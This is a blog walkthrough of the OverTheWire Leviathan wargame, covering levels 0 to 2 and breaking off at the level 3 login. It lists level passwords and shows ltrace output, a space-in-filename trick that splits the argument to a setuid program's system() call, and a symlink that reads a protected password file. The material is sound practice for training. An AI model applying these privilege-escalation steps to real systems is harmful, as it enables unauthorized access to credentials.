+++
author = "Khaled Ngm"
title = "Leviathan walkthrough"
date = "2022-07-04"
description = ""
+++
# OverTheWire: Leviathan Walkthrough
We will discuss Leviathan game walkthrough ,This wargame doesn't require any knowledge about programming - just a bit of common
sense and some knowledge about basic *nix commands .
* ssh connection
* level0
* level1
* level2
* level3
* level4
* level5
* level6
* level7
## ssh connection ``ssh user@host -p port``
  * first we have to establish ssh connection using ``ssh leviathan0@leviathan.labs.overthewire.org -p 2223`` and password ``leviathan0``
## level0
  * then let's use ``ls -la`` command to list files and directories.

  ![List Directories](/images/131196663-0b273faf-2a2a-45a9-95d1-3474616d3c7a.png)
  
  * If we changed direcory to ``.backup`` directory we will find `bookmarks.html` text file .
  * Let's ``grep`` to get any interesting data about next level `leviathan1` .

    ``cat bookmarks.html | grep leviathan1``
  * So we got the password of the next level .
## level1
  * ``ssh leviathan1@leviathan.labs.overthewire.org -p 2223`` and password ``rioGegei8m``
  *   we found elf executable file called `check`, let's execute it .

      ![need pass](/images/131198175-3d06a1ce-52d1-4f57-9d17-dde7da578114.png)

  * As we see it needs a password , so let's use ``ltrace ./check`` command with a wrong password .

     ![compare](/images/131198440-93937c11-d39e-464e-b966-049d57452b74.png)
  * We realize that it compare the password with ``sex`` word , so we can enter password to reed leviathan2 pass from ``/etc/leviathan_pass/leviathan2``.
## level2
  *  ``ssh leviathan2@leviathan.labs.overthewire.org -p 2223`` and password ``ougahZi8Ta``
  *  We found printfile , so let's create temp file to print it's content 
  ```
   leviathan2@leviathan:~$ mkdir /tmp/print
   leviathan2@leviathan:~$ echo hello > /tmp/print/print.txt
  ```
  * Next step we will use ``ltrace ./printfile /tmp/print/print.txt`` command .
   ```
   __libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
   access("/tmp/print/print.txt", 4)                                                                                 = 0
   snprintf("/bin/cat /tmp/print/print.txt", 511, "/bin/cat %s", "/tmp/print/print.txt")                             = 29
   geteuid()                                                                                                         = 12002
   geteuid()                                                                                                         = 12002
   setreuid(12002, 12002)                                                                                            = 0
   system("/bin/cat /tmp/print/print.txt"hello
    <no return ...>
   --- SIGCHLD (Child exited) ---
   <... system resumed> )                                                                                            = 0
   +++ exited (status 0) +++
   ``` 
  * We can see ``access`` function that call file path , we need to call leviathan3 file but we have no permission.
  * If we created a file with space snprintf will read it as two files .
   ```
    __libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
    access("/tmp/print/print hello.txt", 4)                                                                           = 0
    snprintf("/bin/cat /tmp/print/print hello."..., 511, "/bin/cat %s", "/tmp/print/print hello.txt")                 = 35
    geteuid()                                                                                                         = 12002
    geteuid()                                                                                                         = 12002
    setreuid(12002, 12002)                                                                                            = 0   
    system("/bin/cat /tmp/print/print hello.".../bin/cat: /tmp/print/print: No such file or directory
    /bin/cat: hello.txt: No such file or directory
    <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                                            = 256
    +++ exited (status 0) +++
   ```
   * As we can see file name devided into two parts (print and hello.txt) , let's make a symbolic link to the first part .
   
   ``ln -s /etc/leviathan_pass/leviathan3  /tmp/print/print``
   * Finally we can read file and get password of next level .
## level3
   *  ``ssh leviathan3@leviathan.labs.overthewire.org -p 2223`` and password ``Ahdiemoo1j``
 